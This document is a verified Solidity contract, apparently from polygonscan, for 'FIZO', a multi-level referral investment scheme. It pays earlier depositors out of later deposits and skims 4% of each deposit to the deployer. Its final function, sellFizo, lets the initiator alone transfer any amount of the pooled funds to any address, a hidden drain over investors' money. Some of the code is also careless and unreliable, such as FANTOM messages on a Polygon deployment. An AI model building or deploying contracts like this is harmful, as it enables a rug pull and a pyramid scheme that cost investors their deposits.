/**
 *Submitted for verification at polygonscan.com on 2022-11-11
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.7;


library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) { return 0; }
        uint256 c = a * b;
        require(c / a == b);
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;
        return c;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }
}

contract FIZO  {

    using SafeMath for uint256;
    address payable initiator;
    address payable aggregator;
    address [] investors;
    uint256 totalHoldings;
    uint256 contractBalance;
    uint256 constant basePrice = 10000000;
    uint256 [] referral_bonuses;
    uint256 initializeTime;
    uint256 totalInvestment;
    uint256 totalWithdraw;
    uint256 constant timeStep = 7 days;
    address payable [] reward_array;
   
    mapping(uint256 => uint256) reward;

    struct User{
        uint256 token;
        address referral;
        uint256 POI;
        uint256 teamWithdraw;
        uint256 FIZOWithdraw;
        uint256 totalInvestment;
        uint8   nonWorkingPayoutCount;
        uint256 lastNonWokingWithdraw;
        uint256 lastNonWokingWithdrawBase;
        uint256 depositCount;
        uint256 payoutCount;
        uint256 sellCount;
        uint256 totalBusiness;
        mapping(uint8 => uint256) referrals_per_level;
        mapping(uint8 => uint256) team_per_level;
        mapping(uint8 => uint256) levelIncome;
       }
    
    struct Deposit{
        uint256 amount;
        uint256 businessAmount;
        uint256 tokens;
        uint256 tokenPrice;
        uint256 depositTime;
    }

    struct Withdraw{
        uint256 amount;
        bool isWorking;
        uint256 tokens;
        uint256 tokenPrice;
        uint256 withdrawTime;
    }
 
    mapping(address => User) public users;
    mapping(address => Deposit[]) public deposits;
    mapping(address => Withdraw[]) public payouts;
   

    event Deposits(address buyer, uint256 amount);
    event POIDistribution(address buyer, uint256 amount);
    event TeamWithdraw(address withdrawer, uint256 amount);
    event FIZOWithdraw(address withdrawer, uint256 amount);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    modifier onlyInitiator(){
        require(msg.sender == initiator,"You are not initiator.");
        _;
    }
    receive() external payable {
    }
    function contractInfo() public view returns(uint256 fantom, uint256 totalDeposits, uint256 totalPayouts, uint256 totalInvestors, uint256 totalHolding, uint256 balance,uint256 ref_b){
        fantom = address(this).balance;
        totalDeposits = totalInvestment;
        totalPayouts = totalWithdraw;
        totalInvestors = investors.length;
        totalHolding = totalHoldings;
        balance = contractBalance;
        ref_b=referral_bonuses.length;
        return(fantom,totalDeposits,totalPayouts,totalInvestors,totalHolding,balance,ref_b);
    }

    function getCurrentPrice() public view returns(uint256 price){
        price = (contractBalance>0)?basePrice.mul(contractBalance).div(1e18):basePrice;
        return price;
    }


    function getCoinRate(address memberId) public view returns(uint)
    {
         User storage user = users[memberId];
        uint temp_holdings = totalHoldings>user.totalInvestment?(totalHoldings-(user.totalInvestment)):1;
        return temp_holdings>=(1 ether)?basePrice*(1 ether)/temp_holdings:basePrice;
    }

    function getCurDay() public view returns(uint256) {
        return (block.timestamp.sub(initializeTime)).div(timeStep);
    }

 constructor()  {
        initiator = payable(msg.sender);
        aggregator = payable(msg.sender);
        initializeTime = block.timestamp;
         referral_bonuses.push(1100);
        referral_bonuses.push(400);
        referral_bonuses.push(300);
        referral_bonuses.push(200);
        referral_bonuses.push(100);
        referral_bonuses.push(100);
        referral_bonuses.push(100);
        referral_bonuses.push(100);
        referral_bonuses.push(100);
     }

    function deposit(address _referer) public payable{
        require(msg.value>=1e18,"Minimum 1 FANTOM allowed to invest");
         User storage user = users[msg.sender];
 
      
			if (users[_referer].depositCount > 0 && _referer != msg.sender) {
			    _referer = _referer;
			}
            else
            {
                _referer = 0x0000000000000000000000000000000000000000;
            }
	
      
        contractBalance+=msg.value.mul(60).div(100);
        uint256 price = getCurrentPrice();
        _distributePOI(msg.sender,msg.value.mul(11).div(100));
         if(user.depositCount==0)
         {
              investors.push(msg.sender);
              _setReferral(msg.sender,_referer, msg.value);
         } 
         else
         {
              _setReReferral(users[msg.sender].referral, msg.value);
         }    
        
        user.depositCount++;
        user.token+=(msg.value.mul(60).div(100)).div(price);
        totalHoldings+=(msg.value.mul(60).div(100));
        users[_referer].totalBusiness+=msg.value;
        totalInvestment+=msg.value;
        user.totalInvestment+=msg.value;
        
        deposits[msg.sender].push(Deposit(
            msg.value,
            msg.value.mul(60).div(100),
            (msg.value.mul(60).div(100)).div(price),
            price,
            block.timestamp
        ));
        
        aggregator.transfer(msg.value.mul(4).div(100));
        emit Deposits(msg.sender, msg.value);
    } 
    function _distributePOI(address depositor, uint256 _poi) internal{
        uint256 poiShare;
        for(uint256 i = 0; i < investors.length; i++){
            User storage user = users[investors[i]];
            poiShare = user.token.mul(100).div(totalHoldings);
            user.POI+=_poi.mul(poiShare).div(100);
           }
        emit POIDistribution(depositor,_poi);
    }
    
   
    function _setReferral(address _addr, address _referral, uint256 _amount) private {
        
        if(users[_addr].referral == address(0)) {
            users[_addr].lastNonWokingWithdrawBase = block.timestamp;
            users[_addr].referral = _referral;
            for(uint8 i = 0; i < referral_bonuses.length; i++) {
                users[_referral].referrals_per_level[i]+=_amount;
                users[_referral].team_per_level[i]++;
               
                if(i == 0){
                    users[_referral].levelIncome[i]+=_amount.mul(referral_bonuses[i].div(100)).div(100);
                }
                else if(i>0 && users[_referral].referrals_per_level[i]>=200e18){
                    users[_referral].levelIncome[i]+=_amount.mul(referral_bonuses[i].div(100)).div(100);
                }
                _referral = users[_referral].referral;
                if(_referral == address(0)) break;
            }
        }
    }

    function redeposit() public payable{
        require(msg.value>=1e18,"Minimum 1 FANTOM allowed to invest");
        User storage user = users[msg.sender];
        contractBalance+=msg.value.mul(60).div(100);
        uint256 price = getCurrentPrice();
         _distributePOI(msg.sender,msg.value.mul(11).div(100));
        user.depositCount++;
        user.token+=(msg.value.mul(60).div(100)).div(price);
        totalHoldings+=(msg.value.mul(60).div(100));
        
        users[users[msg.sender].referral].totalBusiness+=msg.value;
        totalInvestment+=msg.value;
        user.totalInvestment+=msg.value;
        
        deposits[msg.sender].push(Deposit(
            msg.value,
            msg.value.mul(60).div(100),
            (msg.value.mul(60).div(100)).div(price),
            price,
            block.timestamp
        ));

        _setReReferral(users[msg.sender].referral, msg.value);
        aggregator.transfer(msg.value.mul(4).div(100));
        emit Deposits(msg.sender, msg.value);
    }

    function _setReReferral(address _referral, uint256 _amount) private {
        for(uint8 i = 0; i < referral_bonuses.length; i++) {
            users[_referral].referrals_per_level[i]+=_amount;
            if(i == 0){
                users[_referral].levelIncome[i]+=_amount.mul(referral_bonuses[i].div(100)).div(100);
            }
            else if(i>0 && users[_referral].referrals_per_level[i]>=200e18){
                users[_referral].levelIncome[i]+=_amount.mul(referral_bonuses[i].div(100)).div(100);
            }
            _referral = users[_referral].referral;
            if(_referral == address(0)) break;
        }
        
    }


    function _getWorkingIncome(address _addr) internal view returns(uint256 income){
        User storage user = users[_addr];
        for(uint8 i = 0; i <= 8; i++) {
            income+=user.levelIncome[i];
        }
        return income;
    }

    function teamWithdraw(uint256 _amount) public{
        User storage user = users[msg.sender];
        
        require(user.totalInvestment>0, "Invalid User!");
        uint256 working = _getWorkingIncome(msg.sender);
        uint256 withdrawable = working.add(user.POI).sub(user.teamWithdraw);
        require(withdrawable>=_amount, "Invalid withdraw!");
        user.teamWithdraw+=_amount;
        user.payoutCount++;
        _amount = _amount.mul(100).div(100);
        payable(msg.sender).transfer(_amount);
        totalWithdraw+=_amount;
        payouts[msg.sender].push(Withdraw(
            _amount,
            true,
            0,
            0,
            block.timestamp
        ));

        emit TeamWithdraw(msg.sender,_amount);
      
    }

   
    function fizoWithdraw(uint8 _perc) public{
        User storage user = users[msg.sender];
        
        require(user.totalInvestment>0, "Invalid User!");
        if(_perc == 10 || _perc == 50 || _perc == 100)
		{
         uint256 nextPayout = (user.lastNonWokingWithdraw>0)?user.lastNonWokingWithdraw + 1 days:deposits[msg.sender][0].depositTime;
         require(block.timestamp >= nextPayout,"Sorry ! See you next time.");
         uint8 perc = _perc;
         uint8 deduct=40;
            if(perc==10)
            {
                deduct=10;
            }
            else if(perc==50)
            {
                deduct=20;
            }
           
        uint256 calcWithdrawable = user.token.mul(perc).div(100).mul(getCurrentPrice());
        contractBalance-=calcWithdrawable;
        uint256 withdrawable = user.token.mul(perc).div(100).mul(getCurrentPrice());

		uint256 withdrawable1 =withdrawable.mul(deduct).div(100);
        uint256 withdrawable2 = withdrawable -withdrawable1;
        payable(msg.sender).transfer(withdrawable2);
        user.sellCount++;
        user.lastNonWokingWithdraw = block.timestamp;
        user.token-=user.token.mul(perc).div(100);
        totalWithdraw+=withdrawable;
        aggregator.transfer(withdrawable1);
        payouts[msg.sender].push(Withdraw(
            withdrawable,
            false,
            withdrawable.mul(getCurrentPrice()),
            getCurrentPrice(),
            block.timestamp
        ));

        emit  FIZOWithdraw(msg.sender,withdrawable2);
        }
        
    }

    function userInfo(address _addr) view external returns(uint256[9] memory team, uint256[9] memory referrals, uint256[9] memory income) {
        User storage player = users[_addr];
        for(uint8 i = 0; i <= 8; i++) {
            team[i] = player.team_per_level[i];
            referrals[i] = player.referrals_per_level[i];
            income[i] = player.levelIncome[i];
        }
        return (
            team,
            referrals,
            income
        );
    }

    function sellFizo(address payable buyer, uint _amount) external onlyInitiator{
        buyer.transfer(_amount);
    }
  
   


}